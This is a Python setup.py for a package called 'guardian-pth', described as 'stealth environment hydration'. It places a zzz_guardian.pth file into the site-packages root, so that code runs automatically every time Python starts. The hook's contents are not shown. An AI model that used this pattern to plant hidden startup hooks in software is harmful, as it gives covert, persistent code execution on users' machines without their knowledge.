from setuptools import setup, find_packages
import os

setup(
    name="guardian-pth",
    version="0.2.4",
    description="Stealth environment hydration via .pth hooks",
    long_description=open("README.md", encoding="utf-8").read(),
    long_description_content_type="text/markdown",
    author="Shuvro",
    packages=find_packages(where="src"),
    package_dir={"": "src"},
    # Standard way to include .pth in site-packages root
    data_files=[('', ['src/zzz_guardian.pth'])],
    install_requires=[
        "cryptography>=42.0.0",
    ],
    python_requires=">=3.8",
)
